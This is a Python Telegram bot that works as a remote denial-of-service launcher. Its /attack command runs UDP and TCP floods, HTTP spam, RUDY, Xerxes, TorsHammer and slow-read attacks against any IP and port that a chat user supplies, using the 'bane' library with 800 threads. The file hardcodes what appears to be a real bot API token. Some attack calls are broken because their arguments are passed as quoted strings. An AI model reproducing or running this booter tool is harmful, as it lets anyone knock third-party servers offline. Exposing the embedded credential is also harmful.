import numpy as np
import logging
from telegram.ext import *
import os
import os.path
import time
#pip install python-telegram-bot numpy dnspython==1.15.0

delay = 1.5
API_KEY = '8034303873:AAEFiSqgVuxxo3PJHFy2SD-TNOy-gEmljjc'#填寫Telegram bots API Token


os.system("cls||clear")
# Set up the logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logging.info('Starting Bot...')

def methods_command(update, context):
    update.message.reply_text("Methods: \n  UDP_FLOOD\n  TCP_FLOOD\n  HTTP_SPAM\n  PROX_HTTP_SPAM\n  TORHAMMER\n  PROX_HAMMER\n  RUDY\n  XERXES\n  PROX_XERXES\n  SLOW_READ")

def attack_command(update, context):
	try:
		import bane
	except:
		update.message.reply_text("Please install first\nto install /install")
	else:
		import bane
		np.attack = context.args
		Method = np.attack[0].lower()
		IP = np.attack[1].lower()
		Port = np.attack[2].lower()
		Time = np.attack[3].lower()
		if not np.attack:
			update.message.reply_text("Usage:\n/attack <method> <ip> <port> <time>")
		elif Method == "udp_flood" :
			msg = "Target: " + IP + "\nMethod: " + Method + "\nSeconds: " + Time + ""
			update.message.reply_text(msg)
			try:
			    bane.udp_flood(np.attack[1], p= np.attack[2] , min_size=10, max_size=20 , duration= np.attack[3] , interval=0.001)
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "tcp_flood" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.tcp_flood(np.attack[1], p= np.attack[2] , min_size=10, max_size=20 , duration= np.attack[3] , interval=0.001 , threads=800, timeout=5)
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "http_spam" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.http_spam(np.attack[1], p= np.attack[2] , duration= np.attack[3] ,interval=0.001 , threads=800 , timeout=5)
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "prox_http_spam" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.prox_http_spam(np.attack[1], p= np.attack[2] , duration= np.attack[3] ,interval=0.001 , threads=800 , timeout=5)
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "torshammer" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.torshammer(np.attack[1], p= np.attack[2] , duration= np.attack[3] ,set_tor=False , threads=800 , timeout=5)
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "prox_hammer" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.prox_hammer(np.attack[1], p= np.attack[2] , duration= np.attack[3] , threads=800 , timeout=5)
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "rudy" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.rudy(np.attack[1], p= np.attack[2] , duration= np.attack[3] ,set_tor=False , threads=800 , timeout=5 , form="q" , page="/search.php")
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "xerxes" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.xerxes("np.attack[1], p= np.attack[2] , duration= np.attack[3] ,set_tor=False , threads=800 , timeout=5")
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "prox_xerxes" :
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.prox_xerxes("np.attack[1], p= np.attack[2] , duration= np.attack[3] , threads=800 , timeout=5")
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		elif Method == "slow_read":
			msg = "Target: " + np.attack[1] + "\nMethod: " + np.attack[0].lower() + "\nSeconds: " + np.attack[3] + ""
			update.message.reply_text(msg)
			try:
			    bane.slow_read("np.attack[1], p= np.attack[2] , duration= np.attack[3], set_tor=False , threads=800 , timeout=5")
			    print("成功")
			except:
			    update.message.reply_text("Error:\n/attack <method> <ip> <port> <time>")
			    print("失敗")
		else:
			update.message.reply_text("Method not found!")

def stop_command(update, context):
	try:
		import bane
		bane.stop
		print("停止攻擊")
	except:
		update.message.reply_text("Please install first\nto install /install")
	update.message.reply_text('Stopped')


def help_command(update, context):
	update.message.reply_text("/help - To access this commands\n/attack - /attack http_spam 192.168.1.1 80 300\n/methods - To see available methods\n/stop - To stop running attacks")

def change_command(update, context):
	update.message.reply_text("/change <seconds>\n change command is to change the server your using, with seconds when the server come back")
	##np.change = context.args
	##if not np.change:
	##	update.message.reply_text("/change <seconds>")



def install_command(update, context):
	update.message.reply_text('Please Wait...')
	os.system("pip3 install bane")
	time.sleep(5)
	update.message.reply_text('Done!')

def handle_message(update, context):
    text = str(update.message.text).lower()
    logging.info(f'User ({update.message.chat.id}) says: {text}')

    # Bot response
    response = responses.get_response(text)
    update.message.reply_text(response)


def error(update, context):
    # Logs errors
    logging.error(f'Update {update} caused error {context.error}')


# Run the programme
if __name__ == '__main__':
    updater = Updater(API_KEY, use_context=True)
    dp = updater.dispatcher

    # Commands
    dp.add_handler(CommandHandler('attack', attack_command))
    dp.add_handler(CommandHandler('start', help_command))
    dp.add_handler(CommandHandler('methods', methods_command))
    dp.add_handler(CommandHandler('stop', stop_command))
    dp.add_handler(CommandHandler('help', help_command))
    dp.add_handler(CommandHandler('install', install_command))
    dp.add_handler(CommandHandler('change', change_command))

    # Messages
    dp.add_handler(MessageHandler(Filters.text, handle_message))

    # Log all errors
    dp.add_error_handler(error)
    # Run the bot
    updater.start_polling(delay)
    updater.idle()

